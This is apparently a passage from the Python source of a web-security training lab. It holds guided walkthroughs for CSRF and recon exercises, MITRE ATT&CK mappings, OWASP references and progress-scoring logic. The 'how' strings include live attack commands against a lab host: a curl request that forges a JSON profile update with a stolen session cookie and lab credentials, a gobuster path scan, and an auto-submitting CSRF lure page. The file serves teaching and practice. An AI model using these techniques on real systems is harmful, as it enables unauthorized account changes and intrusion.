                    "look_for": "A 'Profile changed without CSRF protection' card.",
                },
            ],
        },
        "lure_page": {
            "overview": (
                "This is CSRF as it happens in the wild. The lab ships an attacker page, /evil/csrf-demo, "
                "that auto-submits a forged profile update the moment a logged-in victim opens it. The "
                "victim never clicks anything malicious — just visiting the page (while logged in elsewhere) "
                "is enough to change their account."
            ),
            "sections": [
                {
                    "what": "Set up the victim: an authenticated session is the precondition for the lure to work.",
                    "how":  "Log in as admin in the lab browser so you hold a live session.",
                    "look_for": "A 'Successful login observed' card.",
                },
                {
                    "what": "Open the attacker-controlled page. It contains a hidden form targeting /profile/update "
                            "that fires automatically — simulating a malicious site you stumbled onto.",
                    "how":  "Navigate to /evil/csrf-demo in the lab browser while still logged in.",
                    "look_for": "An 'Attacker lure page visited' card.",
                },
                {
                    "what": "Proof: the lure's auto-submitted request changed your profile silently, using your cookie.",
                    "how":  "The page auto-submits; then re-open /profile/ and confirm the email changed.",
                    "look_for": "A 'Forged form submitted' and 'Profile changed without CSRF protection' card.",
                },
            ],
        },
        "json_bypass": {
            "overview": (
                "Some apps add CSRF defences only to form-encoded POSTs and forget about JSON. By sending "
                "the same state-changing request with Content-Type: application/json, you can slip past a "
                "filter that only inspects classic form submissions — a subtle but common real-world gap."
            ),
            "sections": [
                {
                    "what": "Authenticate to get a session, as with any CSRF test.",
                    "how":  "Log in as admin:password123 and keep the cookie (curl -c /tmp/c.txt ...).",
                    "look_for": "A 'Successful login observed' card.",
                },
                {
                    "what": "Re-send the profile update as JSON instead of form data. Filters that only guard "
                            "application/x-www-form-urlencoded won't inspect this.",
                    "how":  "curl -b /tmp/c.txt -H 'Content-Type: application/json' "
                            "-d '{\"email\":\"pwned@evil.lab\"}' http://target-agent/profile/update.",
                    "look_for": "A 'Profile update used' card — the JSON body was accepted.",
                },
                {
                    "what": "Proof: the change persisted, confirming the JSON path bypassed CSRF protection.",
                    "how":  "Re-read the profile and confirm the email is now pwned@evil.lab.",
                    "look_for": "A 'Profile changed without CSRF protection' card.",
                },
            ],
        },
    },

    # ─── RECON ──────────────────────────────────────────────────────────
    "recon": {
        "manual": {
            "overview": (
                "Reconnaissance is mapping the target before you attack. Manual recon means walking the "
                "app like a curious user — clicking every link, reading every page — to build a mental "
                "map of the features and where they might be weak. It's slow but stealthy and teaches you "
                "the app's real shape."
            ),
            "sections": [
                {
                    "what": "Start at the front door. The home page usually links to most of the app's features.",
                    "how":  "Open / in the lab browser and read what's there.",
                    "look_for": "A 'Portal visited' card.",
                },
                {
                    "what": "Visit the distinct areas the app exposes — search, profile, file viewer, diagnostics. "
                            "Each is a candidate attack surface for a later module.",
                    "how":  "Click through to at least 3 areas: /search, /profile/, /files/read, /system/ping.",
                    "look_for": "Several 'Route discovered' / feature-used cards (3+ areas marks this done).",
                },
                {
                    "what": "Visiting enough distinct areas in sequence trips the lab's recon-sequence detector — "
                            "the blue-team signature of someone mapping the app.",
                    "how":  "Keep exploring until you've hit 4+ distinct areas.",
                    "look_for": "A 'Recon sequence detected' card.",
                },
            ],
        },
        "wordlist": {
            "overview": (
                "Wordlist (or content) discovery finds routes that aren't linked anywhere on the site. "
                "Tools like gobuster/ffuf hammer the server with a list of common paths and keep the ones "
                "that return something — uncovering hidden admin panels, demos, and forgotten endpoints "
                "the developers never advertised."
            ),
            "sections": [
                {
                    "what": "Confirm the target is up and how it responds to a known-good path, so you can tell hits "
                            "from misses during the scan.",
                    "how":  "curl -i http://target-agent/ and note the response.",
                    "look_for": "A 'Portal visited' card.",
                },
                {
                    "what": "Brute-force paths with a wordlist. Every 200/301/302 is a real route the home page "
                            "may not link to.",
                    "how":  "gobuster dir -u http://target-agent -w /usr/share/wordlists/dirb/common.txt -t 20 "
                            "(or loop curl over a path list), then visit each hit.",
                    "look_for": "Multiple 'Route discovered' cards (4+ endpoints marks this done).",
                },
                {
                    "what": "The payoff of fuzzing is the hidden stuff — a route or clue not reachable by clicking, "
                            "like /evil/csrf-demo or /robots.txt.",
                    "how":  "Request the non-obvious paths your wordlist surfaced and read them.",
                    "look_for": "A 'Hidden clue accessed' (or lure-visited) card.",
                },
            ],
        },
        "comment_hunting": {
            "overview": (
                "Developers leak secrets in plain sight: HTML comments, version banners, and debug notes "
                "left in the page source. Comment hunting means reading the raw HTML/JS — not the rendered "
                "page — for these mistakes. A single '<!-- TODO: remove admin login /secret-admin -->' can "
                "hand you the whole app."
            ),
            "sections": [
                {
                    "what": "Grab the raw source of the home page — comments and banners live in the HTML, not the "
                            "visible page.",
                    "how":  "curl -s http://target-agent/ and read the full markup.",
                    "look_for": "A 'Portal visited' card.",
                },
                {
                    "what": "Grep the source for tell-tale leaks: HTML comments, 'Server'/'version' strings, "
                            "framework banners. These reveal stack details and sometimes hidden URLs.",
                    "how":  "curl -s http://target-agent/ | grep -iE '<!--|server|version|powered' and inspect "
                            "headers with curl -sI.",
                    "look_for": "Several 'Route discovered' / feature cards as you follow the leads.",
                },
                {
                    "what": "Comments often point at something hidden — an admin path, a demo page, a backup. "
                            "Following the leak uncovers a non-obvious route.",
                    "how":  "Visit whatever URL or hint the comments disclosed.",
                    "look_for": "A 'Hidden clue accessed' card.",
                },
            ],
        },
    },
}


def get_walkthrough(module_id: str, variant_id: Optional[str]) -> Optional[Dict[str, Any]]:
    """Return the walkthrough entry for (module, variant), defaulting to the
    first variant when none is supplied. None when no teaching content exists."""
    mod = WALKTHROUGH.get(module_id)
    if not mod:
        return None
    if not variant_id:
        variant_id = next(iter(MODULE_VARIANTS.get(module_id, {})), None)
    return mod.get(variant_id)


# ═══════════════════════════════════════════════════════════════════════════
#  MITRE ATT&CK — one technique per walkthrough section (aligned by index).
#  Format: "Txxxx[.yyy] · Short technique name". The frontend turns the id
#  into a clickable attack.mitre.org link so each section is grounded in the
#  authoritative ATT&CK knowledge base.
# ═══════════════════════════════════════════════════════════════════════════
SECTION_TECHNIQUES: Dict[str, Dict[str, List[str]]] = {
    "brute_force": {
        "password_spray": [
            "T1589.001 · Gather Victim Identity Information: Credentials",
            "T1087 · Account Discovery",
            "T1110.003 · Brute Force: Password Spraying",
            "T1078 · Valid Accounts",
        ],
        "credential_stuffing": [
            "T1595 · Active Scanning",
            "T1110.004 · Brute Force: Credential Stuffing",
            "T1110 · Brute Force",
            "T1078 · Valid Accounts",
        ],
        "hydra_targeted": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1110.001 · Brute Force: Password Guessing",
            "T1110 · Brute Force",
            "T1078 · Valid Accounts",
        ],
    },
    "xss": {
        "reflected": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1059.007 · Command and Scripting Interpreter: JavaScript",
            "T1189 · Drive-by Compromise",
        ],
        "alternate_context": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1059.007 · Command and Scripting Interpreter: JavaScript",
            "T1059.007 · Command and Scripting Interpreter: JavaScript",
        ],
        "stored_attempt": [
            "T1078 · Valid Accounts",
            "T1059.007 · Command and Scripting Interpreter: JavaScript",
            "T1189 · Drive-by Compromise",
        ],
    },
    "cmd_injection": {
        "semicolon_basic": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1059 · Command and Scripting Interpreter",
            "T1059.004 · Command and Scripting Interpreter: Unix Shell",
        ],
        "pipe_redirect": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1059 · Command and Scripting Interpreter",
            "T1059.004 · Command and Scripting Interpreter: Unix Shell",
        ],
        "subshell": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1059 · Command and Scripting Interpreter",
            "T1059.004 · Command and Scripting Interpreter: Unix Shell",
        ],
    },
    "dir_traversal": {
        "plain": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1083 · File and Directory Discovery",
            "T1005 · Data from Local System",
        ],
        "encoded": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1027 · Obfuscated Files or Information",
            "T1005 · Data from Local System",
        ],
        "absolute": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1083 · File and Directory Discovery",
            "T1005 · Data from Local System",
        ],
    },
    "file_upload": {
        "wrong_extension": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1505.003 · Server Software Component: Web Shell",
            "T1190 · Exploit Public-Facing Application",
        ],
        "mime_spoof": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1036 · Masquerading",
            "T1505.003 · Server Software Component: Web Shell",
        ],
        "polyglot": [
            "T1595.002 · Active Scanning: Vulnerability Scanning",
            "T1027 · Obfuscated Files or Information",
            "T1505.003 · Server Software Component: Web Shell",
        ],
    },
    "csrf": {
        "basic_forgery": [
            "T1539 · Steal Web Session Cookie",
            "T1190 · Exploit Public-Facing Application",
            "T1565.001 · Data Manipulation: Stored Data Manipulation",
        ],
        "lure_page": [
            "T1078 · Valid Accounts",
            "T1189 · Drive-by Compromise",
            "T1565.001 · Data Manipulation: Stored Data Manipulation",
        ],
        "json_bypass": [
            "T1078 · Valid Accounts",
            "T1190 · Exploit Public-Facing Application",
            "T1565.001 · Data Manipulation: Stored Data Manipulation",
        ],
    },
    "recon": {
        "manual": [
            "T1594 · Search Victim-Owned Websites",
            "T1592 · Gather Victim Host Information",
            "T1595.002 · Active Scanning: Vulnerability Scanning",
        ],
        "wordlist": [
            "T1595 · Active Scanning",
            "T1595.003 · Active Scanning: Wordlist Scanning",
            "T1083 · File and Directory Discovery",
        ],
        "comment_hunting": [
            "T1594 · Search Victim-Owned Websites",
            "T1592.002 · Gather Victim Host Information: Software",
            "T1213 · Data from Information Repositories",
        ],
    },
}


# ── Authoritative references per module (OWASP / online databases) ──────────
REFERENCES: Dict[str, Dict[str, str]] = {
    "brute_force":   {"label": "OWASP: Brute Force Attack",        "url": "https://owasp.org/www-community/attacks/Brute_force_attack"},
    "xss":           {"label": "OWASP: Cross Site Scripting (XSS)", "url": "https://owasp.org/www-community/attacks/xss/"},
    "cmd_injection": {"label": "OWASP: Command Injection",          "url": "https://owasp.org/www-community/attacks/Command_Injection"},
    "dir_traversal": {"label": "OWASP: Path Traversal",            "url": "https://owasp.org/www-community/attacks/Path_Traversal"},
    "file_upload":   {"label": "OWASP: Unrestricted File Upload",  "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"},
    "csrf":          {"label": "OWASP: Cross-Site Request Forgery", "url": "https://owasp.org/www-community/attacks/csrf"},
    "recon":         {"label": "OWASP WSTG: Information Gathering", "url": "https://owasp.org/www-project-web-security-testing-guide/"},
}

DATABASE_REFERENCES: Dict[str, List[Dict[str, str]]] = {
    "brute_force": [
        {"label": "OWASP Brute Force", "url": "https://owasp.org/www-community/attacks/Brute_force_attack", "kind": "OWASP"},
        {"label": "CWE-307 Excessive Authentication Attempts", "url": "https://cwe.mitre.org/data/definitions/307.html", "kind": "CWE"},
        {"label": "CWE-287 Improper Authentication", "url": "https://cwe.mitre.org/data/definitions/287.html", "kind": "CWE"},
    ],
    "xss": [
        {"label": "OWASP Cross Site Scripting", "url": "https://owasp.org/www-community/attacks/xss/", "kind": "OWASP"},
        {"label": "CWE-79 Cross-site Scripting", "url": "https://cwe.mitre.org/data/definitions/79.html", "kind": "CWE"},
        {"label": "OWASP WSTG Client-side Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/", "kind": "WSTG"},
    ],
    "cmd_injection": [
        {"label": "OWASP Command Injection", "url": "https://owasp.org/www-community/attacks/Command_Injection", "kind": "OWASP"},
        {"label": "CWE-78 OS Command Injection", "url": "https://cwe.mitre.org/data/definitions/78.html", "kind": "CWE"},
        {"label": "CAPEC-248 Command Injection", "url": "https://capec.mitre.org/data/definitions/248.html", "kind": "CAPEC"},
    ],
    "dir_traversal": [
        {"label": "OWASP Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal", "kind": "OWASP"},
        {"label": "CWE-22 Path Traversal", "url": "https://cwe.mitre.org/data/definitions/22.html", "kind": "CWE"},
        {"label": "CAPEC-126 Path Traversal", "url": "https://capec.mitre.org/data/definitions/126.html", "kind": "CAPEC"},
    ],
    "file_upload": [
        {"label": "OWASP Unrestricted File Upload", "url": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload", "kind": "OWASP"},
        {"label": "CWE-434 Unrestricted Upload", "url": "https://cwe.mitre.org/data/definitions/434.html", "kind": "CWE"},
        {"label": "CAPEC-650 Upload a Web Shell", "url": "https://capec.mitre.org/data/definitions/650.html", "kind": "CAPEC"},
    ],
    "csrf": [
        {"label": "OWASP CSRF", "url": "https://owasp.org/www-community/attacks/csrf", "kind": "OWASP"},
        {"label": "CWE-352 Cross-Site Request Forgery", "url": "https://cwe.mitre.org/data/definitions/352.html", "kind": "CWE"},
        {"label": "OWASP CSRF Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html", "kind": "Cheat Sheet"},
    ],
    "recon": [
        {"label": "OWASP WSTG Information Gathering", "url": "https://owasp.org/www-project-web-security-testing-guide/", "kind": "WSTG"},
        {"label": "CWE-200 Exposure of Sensitive Information", "url": "https://cwe.mitre.org/data/definitions/200.html", "kind": "CWE"},
        {"label": "ATT&CK Reconnaissance", "url": "https://attack.mitre.org/tactics/TA0043/", "kind": "MITRE"},
    ],
}

MODULE_SECTION_PHASES: Dict[str, List[str]] = {
    "recon": ["Reconnaissance", "Discovery", "Discovery"],
    "brute_force": ["Credential access", "Account discovery", "Detection signal", "Valid accounts"],
    "xss": ["Input discovery", "Payload delivery", "Execution"],
    "cmd_injection": ["Input discovery", "Command execution", "Impact proof"],
    "dir_traversal": ["Input discovery", "File discovery", "Collection"],
    "file_upload": ["Upload baseline", "Payload delivery", "Public exposure"],
    "csrf": ["Session setup", "Request forgery", "Stored data manipulation"],
}


def _section_phase(module_id: str, index: int) -> str:
    phases = MODULE_SECTION_PHASES.get(module_id) or []
    if not phases:
        return "Attack path"
    return phases[index] if index < len(phases) else phases[-1]


def build_walkthrough(module_id: str, variant_id: Optional[str] = None) -> Dict[str, Any]:
    """Assemble the full guided-room payload for a (module, variant) WITHOUT
    needing a started session. Consumed by GET /api/modules/{id}/walkthrough
    and rendered as the TryHackMe-style guided room."""
    variants = MODULE_VARIANTS.get(module_id, {})
    if not variant_id or variant_id not in variants:
        variant_id = next(iter(variants), None)
    variant = variants.get(variant_id) or {}
    wt = (WALKTHROUGH.get(module_id, {}) or {}).get(variant_id) or {}
    tasks = variant.get("tasks", [])
    techs = (SECTION_TECHNIQUES.get(module_id, {}) or {}).get(variant_id, [])
    secs  = wt.get("sections", [])
    database_refs = DATABASE_REFERENCES.get(module_id, [])

    sections: List[Dict[str, Any]] = []
    for i in range(max(len(tasks), len(secs))):
        sec = secs[i] if i < len(secs) else {}
        t   = tasks[i] if i < len(tasks) else {}
        sections.append({
            "title":    t.get("title") or f"Step {i + 1}",
            "phase":    sec.get("phase") or _section_phase(module_id, i),
            "what":     sec.get("what"),
            "how":      sec.get("how") or t.get("explain"),
            "look_for": sec.get("look_for"),
            "checkpoint": t.get("explain"),
            "mitre":    techs[i] if i < len(techs) else None,
            "database_refs": database_refs,
        })

    spec = PROGRESS_SPECS.get(module_id, {})
    return {
        "module_id":         module_id,
        "variant_id":        variant_id,
        "variant_name":      variant.get("name"),
        "variant_description": variant.get("description"),
        "difficulty":        variant.get("difficulty"),
        "techniques":        variant.get("techniques", []),
        "overview":          wt.get("overview"),
        "defensive_insight": spec.get("defensive_insight"),
        "reference":         REFERENCES.get(module_id),
        "database_refs":     database_refs,
        "sections":          sections,
    }


def get_variant_spec(module_id: str, variant_id: Optional[str]) -> Optional[Dict[str, Any]]:
    """Return the variant entry for (module, variant) or None if unknown."""
    variants = MODULE_VARIANTS.get(module_id)
    if not variants:
        return None
    if not variant_id:
        # First variant is the default
        variant_id = next(iter(variants))
    return variants.get(variant_id)


def list_variants(module_id: str) -> List[Dict[str, Any]]:
    """Return a list of (id + metadata) for the module's variants — used by the UI picker."""
    variants = MODULE_VARIANTS.get(module_id, {})
    return [
        {
            "variant_id":  vid,
            "name":        v["name"],
            "description": v["description"],
            "difficulty":  v.get("difficulty", "Medium"),
            "techniques":  v.get("techniques", []),
        }
        for vid, v in variants.items()
    ]


# ═══════════════════════════════════════════════════════════════════════════
#  OBJECTIVE-BASED PROGRESS MODEL
#
#  Mission COMPLETION is objective-based: it depends on reaching the real attack
#  target, NOT on finishing a fixed checklist in order. Learning QUALITY (did the
#  student follow good methodology?) is scored separately and NEVER blocks
#  completion. Safety is confirmed by the existing operator gating and surfaced
#  as non-blocking warnings.
#
#  Each module declares:
#    objective          — one-line student-facing goal (no solution leak)
#    completion_groups  — list of OR-groups. A group is satisfied when ANY of its
#                         event types is observed *through the gated channel*
#                         (operator route + backend=operator + approved tool in
#                         lab mode). ALL groups must be satisfied → objective
#                         reached. One correct action can satisfy several groups.
#    quality_tasks      — recommended methodology signals used for scoring and
#                         report coaching. Each: id, label, recommendation, and a
#                         matcher (event_types and/or via). Matched against ALL
#                         module events (any channel) so e.g. inspecting in the
#                         browser still earns methodology credit.
#
#  brute_force keeps its dedicated failure-count completion (unchanged); its
#  quality tasks are scored the same way as every other module.
# ═══════════════════════════════════════════════════════════════════════════
_CAP_VIA = ["browser", "zap_repeater", "zap_fuzzer"]   # request visible in ZAP history

OBJECTIVE_SPECS: Dict[str, Dict[str, Any]] = {
    "recon": {
        "objective": "Discover and verify a hidden local route on the operator portal.",
        "completion_groups": [["hidden_clue_accessed", "recon_sequence_observed"]],
        "quality_tasks": [
            {"id": "portal_mapped", "label": "Map the portal home first",
             "event_types": ["portal_visited"],
             "recommendation": "Start by visiting /op/ and mapping the visible routes."},
            {"id": "discovery_files_checked", "label": "Check common discovery files",
             "event_types": ["route_discovered"],
             "recommendation": "Request /op/robots.txt and /op/.well-known/security.txt and read the responses."},
            {"id": "verified_with_tool", "label": "Verify a route with Repeater or AttackBox",
             "via": ["zap_repeater", "attackbox"],
             "recommendation": "Confirm an interesting path with ZAP Repeater or a safe AttackBox curl before trusting it."},
        ],
    },
    "xss": {
        "objective": "Trigger a safe reflected XSS proof on /op/search.",
        "completion_groups": [
            ["xss_payload_observed"],
            ["reflected_input_detected", "stored_payload_observed"],
        ],
        "quality_tasks": [
            {"id": "request_captured", "label": "Capture the request in ZAP", "via": _CAP_VIA,
             "recommendation": "Submit a query and capture the /op/search request in ZAP Proxy History."},
            {"id": "context_inspected", "label": "Inspect the reflection context",
             "event_types": ["xss_context_identified"],
             "recommendation": "Use the Inspector to find where your input is reflected before choosing a payload."},
            {"id": "repeater_used", "label": "Test through Repeater", "via": ["zap_repeater"],
             "recommendation": "Send the request to Repeater and change one thing at a time."},
            {"id": "marker_first", "label": "Test a harmless marker first",
             "event_types": ["xss_marker_tested"],
             "recommendation": "Test a benign marker (e.g. ATTENSE_XSS_PROOF) before a live payload."},
            {"id": "fuzzer_used", "label": "Iterate payloads with the Fuzzer", "via": ["zap_fuzzer"],
             "recommendation": "Use the Fuzzer to iterate payload variants against the input parameter."},
        ],
    },
    "cmd_injection": {
        "objective": "Prove OS command execution on /op/system/ping with a harmless command.",
        "completion_groups": [["command_injection_detected"]],
        "quality_tasks": [
            {"id": "request_captured", "label": "Capture the request in ZAP", "via": _CAP_VIA,
             "recommendation": "Capture the /op/system/ping request in ZAP Proxy History."},
            {"id": "baseline_first", "label": "Establish a clean baseline",
             "event_types": ["diagnostics_used"],
             "recommendation": "Send a normal host value first so you can tell injected output from normal output."},
            {"id": "repeater_used", "label": "Test through Repeater", "via": ["zap_repeater"],
             "recommendation": "Use Repeater and modify one parameter at a time."},
            {"id": "separator_tested", "label": "Test a shell separator",
             "event_types": ["command_separator_observed"],
             "recommendation": "Add one separator at a time and compare responses."},
            {"id": "fuzzer_used", "label": "Iterate separators with the Fuzzer", "via": ["zap_fuzzer"],
             "recommendation": "Use the Fuzzer to test separators when unsure which one works."},
        ],
    },
    "dir_traversal": {
        "objective": "Disclose a sensitive lab file via the /op/files/read parameter.",
        "completion_groups": [
            ["sensitive_file_disclosed", "lab_file_disclosed"],
            ["traversal_pattern_observed"],
        ],
        "quality_tasks": [
            {"id": "request_captured", "label": "Capture the request in ZAP", "via": _CAP_VIA,
             "recommendation": "Capture the /op/files/read request in ZAP Proxy History."},
            {"id": "baseline_first", "label": "Request a normal file first",
             "event_types": ["file_viewer_used"],
             "recommendation": "Read a normal filename first as your baseline."},
            {"id": "repeater_used", "label": "Test through Repeater", "via": ["zap_repeater"],
             "recommendation": "Use Repeater and modify only the filename parameter."},
            {"id": "encoded_variant", "label": "Try an encoded variant if filtered",
             "event_types": ["traversal_encoded_tested"],
             "recommendation": "If plain sequences are filtered, test encoded variants."},
        ],
    },
    "file_upload": {
        "objective": "Get a dangerous file accepted by /op/files/upload.",
        "completion_groups": [
            ["unrestricted_upload_detected", "dangerous_extension_accepted", "uploaded_file_retrieved"],
        ],
        "quality_tasks": [
            {"id": "multipart_captured", "label": "Capture the multipart request",
             "event_types": ["file_upload_used"],
             "recommendation": "Capture the multipart /op/files/upload request and inspect its fields."},
            {"id": "request_captured", "label": "Inspect the request in ZAP", "via": _CAP_VIA,
             "recommendation": "Inspect the filename field and the file part Content-Type in ZAP."},
            {"id": "repeater_used", "label": "Test through Repeater", "via": ["zap_repeater"],
             "recommendation": "Use Repeater and change one validation field at a time (extension or Content-Type)."},
            {"id": "retrieved_proof", "label": "Retrieve the uploaded proof file",
             "event_types": ["uploaded_file_retrieved"],
             "recommendation": "Retrieve the uploaded proof file to confirm it is served (use a harmless file only)."},
        ],
    },
    "csrf": {
        "objective": "Change the profile via /op/profile/update without a CSRF token.",
        "completion_groups": [["profile_changed_without_csrf"]],
        "quality_tasks": [
            {"id": "request_captured", "label": "Capture the state-changing request", "via": _CAP_VIA,
             "recommendation": "Capture the /op/profile/update request in ZAP Proxy History."},
            {"id": "token_absence_identified", "label": "Identify the missing CSRF token",
             "event_types": ["csrf_token_missing"],
             "recommendation": "Confirm the state-changing request carries no CSRF token."},
            {"id": "repeater_used", "label": "Confirm the change through Repeater", "via": ["zap_repeater"],
             "recommendation": "Replay the request from Repeater without a token to confirm it still works."},
            {"id": "lure_used", "label": "Use the local lure page",
             "event_types": ["csrf_lure_visited", "csrf_lure_submitted"],
             "recommendation": "Use the local /op/evil/csrf-demo lure to recreate the cross-site submission."},
        ],
    },
    "brute_force": {
        "objective": "Trip the brute-force detector and confirm a valid credential on /op/auth/login.",
        # Completion is computed by the dedicated brute_force_activity logic, not
        # these groups; they are kept for documentation/report labelling.
        "completion_groups": [["brute_force_pattern"], ["credential_found", "login_success"]],
        "quality_tasks": [
            {"id": "request_captured", "label": "Capture the login request", "via": _CAP_VIA,
             "recommendation": "Capture the POST /op/auth/login request in ZAP Proxy History."},
            {"id": "repeater_used", "label": "Understand the request in Repeater", "via": ["zap_repeater"],
             "recommendation": "Send the request to Repeater to learn its format before automating."},
            {"id": "fuzzer_used", "label": "Automate with the Fuzzer", "via": ["zap_fuzzer"],
             "recommendation": "Use the Fuzzer with the local wordlist and compare status/length between attempts."},
            {"id": "credential_confirmed", "label": "Confirm the credential",
             "event_types": ["credential_found", "login_success"],
             "recommendation": "Confirm the working credential returns a 302 to /profile/."},
        ],
    },
}


def get_objective_spec(module_id: str) -> Dict[str, Any]:
    """Return the objective spec for a module (empty dict if none)."""
    return OBJECTIVE_SPECS.get(module_id, {})


def completion_event_types(module_id: str) -> List[str]:
    """Flat list with one representative event type per completion group — the
    minimum evidence that proves the objective. Used by tests and callers that
    need to synthesise a 'just completed' evidence set."""
    groups = OBJECTIVE_SPECS.get(module_id, {}).get("completion_groups", [])
    return [g[0] for g in groups if g]


def _quality_task_matched(qt: Dict[str, Any], module_events: List[Dict[str, Any]]) -> bool:
    ets = set(qt.get("event_types", []))
    vias = set(qt.get("via", []))
    for e in module_events:
        if ets and e.get("event_type") in ets:
            return True
        if vias and str(e.get("via") or "") in vias:
            return True
    return False


def _quality_report(module_id: str,
                    module_events: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Score recommended methodology. NEVER affects completion."""
    tasks = OBJECTIVE_SPECS.get(module_id, {}).get("quality_tasks", [])
    completed: List[Dict[str, str]] = []
    missing: List[Dict[str, str]] = []
    for qt in tasks:
        entry = {"id": qt["id"], "label": qt["label"],
                 "recommendation": qt.get("recommendation", "")}
        (completed if _quality_task_matched(qt, module_events) else missing).append(entry)
    total = len(tasks)
    score = int(round(100 * len(completed) / total)) if total else 0
    return {"completed": completed, "missing": missing, "score": score, "total": total}


def _completion_report(module_id: str,
                       gated_events: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Objective-based completion from gated events. Returns reached flag,
    a 0-100 completion score (proportional across groups), and human labels for
    the groups already satisfied."""
    groups = OBJECTIVE_SPECS.get(module_id, {}).get("completion_groups", [])
    seen = {e.get("event_type") for e in gated_events}
    satisfied = [g for g in groups if any(t in seen for t in g)]
    reached = len(groups) > 0 and len(satisfied) == len(groups)
    score = int(round(100 * len(satisfied) / len(groups))) if groups else 0
    labels: List[str] = []
    for g in satisfied:
        hit = next((t for t in g if t in seen), g[0])
        labels.append(_evidence_title(hit))
    return {"reached": reached, "score": score, "completed_required": labels}


def compute(module_id: str,
            mission_started_at: float,
            session_completed_steps: Optional[List[int]] = None,
            mode: str = "tutorial",
            variant_id: Optional[str] = None,
            session_id: Optional[str] = None,
            ) -> Dict[str, Any]:
    """
    Returns a learner-facing progress payload:
        {
          module_id, mode, variant_id, progress_percent, completed_tasks: [int],
          tasks: [...with .complete + .matched_events],
          evidence: [card],
          success: bool,
          learner_message, defensive_insight,
        }

    `mode` selects evidence-channel gating:
      - "tutorial" → counts evidence from any channel (browser, attackbox, …)
      - "lab"      → only counts evidence from attackbox/zap_repeater/zap_fuzzer.

    `variant_id` selects the specific attack flavour (e.g. "password_spray",
    "credential_stuffing", "hydra_targeted" for brute_force).  When set, the
    variant's tasks REPLACE the module's default ladder, and the variant's
    success_event_types REPLACE the default success criteria.  When omitted
    the legacy default ladder is used.

    Legacy values "guided" and "operator" are normalised to "tutorial"/"lab".
    """
    # Normalise legacy mode names
    if mode == "guided":
        mode = "tutorial"
    elif mode == "operator":
        mode = "lab"
    if mode not in ("tutorial", "lab"):
        mode = "tutorial"

    spec = PROGRESS_SPECS.get(module_id)
    if not spec:
        return {
            "module_id": module_id,
            "mode": mode,
            "variant_id": variant_id,
            "progress_percent": 0,
            "completed_tasks": [],
            "tasks": [],
            "evidence": [],
            "success": False,
            "learner_message": f"No progress specification for module {module_id!r}.",
            "defensive_insight": None,
        }

    # ─── Resolve variant ────────────────────────────────────────────────
    # If a known variant is supplied, its tasks replace the default ladder
    # and its success_event_types replace the default success criteria.
    variant = get_variant_spec(module_id, variant_id)
    is_lab = (mode == "lab")

    if variant is not None:
        task_ladder = variant["tasks"]
        variant_id_out = variant_id or next(iter(MODULE_VARIANTS.get(module_id, {})), None)
    else:
        # Legacy path — use the module's default tasks_lab / tasks_tutorial
        task_ladder = (
            spec.get("tasks_lab") if is_lab else None
        ) or spec.get("tasks_tutorial", spec.get("tasks", []))
        variant_id_out = None

    # Fetch ALL events since mission start — do NOT filter by module_id here.
    # Cross-module events (e.g. search_used is tagged 'xss' but counts for recon
    # task 2) must be visible. Task-level event_type matching below handles scoping.
    raw_events = fetch_events(since=mission_started_at, limit=500)

    if module_id == "brute_force":
        events_for_progress = [
            e for e in raw_events
            if _is_brute_force_event_for_mode(e, is_lab=is_lab)
        ]
    else:
        # Every other module now uses the SAME operator/guided contract the
        # brute-force module proved out: in lab mode an event only counts when it
        # hit the /op/ operator surface (backend=operator) through an approved
        # local tool; in tutorial mode operator-surface events are excluded so the
        # two modes never cross-complete. Browser-driven operator traffic still
        # appears in cards (so the learner can see what they did) but does NOT
        # count toward task completion.
        events_for_progress = [
            e for e in raw_events
            if _event_counts_for_mode(e, is_lab=is_lab)
        ]

    # Teaching content (TryHackMe-style) for this (module, variant), if any.
    walkthrough = get_walkthrough(module_id, variant_id_out)
    wt_sections = (walkthrough or {}).get("sections", [])

    # Build task results
    tasks_out = []
    completed_idx: List[int] = []
    for idx, t in enumerate(task_ladder):
        wanted_types = set(t["event_types"])
        matches = [e for e in events_for_progress if e.get("event_type") in wanted_types]
        min_count = t.get("min_count", 1)
        complete = len(matches) >= min_count
        if complete:
            completed_idx.append(idx)
        section = wt_sections[idx] if idx < len(wt_sections) else {}
        tasks_out.append({
            "title":          t["title"],
            "explain":        t.get("explain"),
            # Rich teaching content — falls back to `explain` when absent.
            "what":           section.get("what"),
            "how":            section.get("how") or t.get("explain"),
            "look_for":       section.get("look_for"),
            "complete":       complete,
            "match_count":    len(matches),
            "min_count":      min_count,
            "event_types":    t["event_types"],
        })

    # Gather all event_types referenced in this ladder so evidence cards
    # stay scoped to the current module (no cross-module noise in the panel).
    spec_event_types: set = set()
    for t in task_ladder:
        spec_event_types.update(t["event_types"])
    # Objective + quality event types are always in-scope so completion evidence
    # and methodology signals show as cards even when they aren't on the ladder.
    _obj = OBJECTIVE_SPECS.get(module_id, {})
    for g in _obj.get("completion_groups", []):
        spec_event_types.update(g)
    for qt in _obj.get("quality_tasks", []):
        spec_event_types.update(qt.get("event_types", []))

    # Success criteria: variant overrides default
    if variant is not None:
        variant_success = set(variant.get("success_event_types") or [])
        spec_event_types.update(variant_success)
        success_required = variant_success
    else:
        success_key = "success_lab" if is_lab and spec.get("success_lab") else "success_tutorial"
        spec_event_types.update(spec.get(success_key) or [])
        success_required = set(spec.get(success_key) or [])

    # Build evidence cards (one per event_type, keep latest occurrence).
    # We use raw_events here (not the gated set) so a learner who clicked
    # in the browser still sees their actions — they just don't count.
    seen_types: set = set()
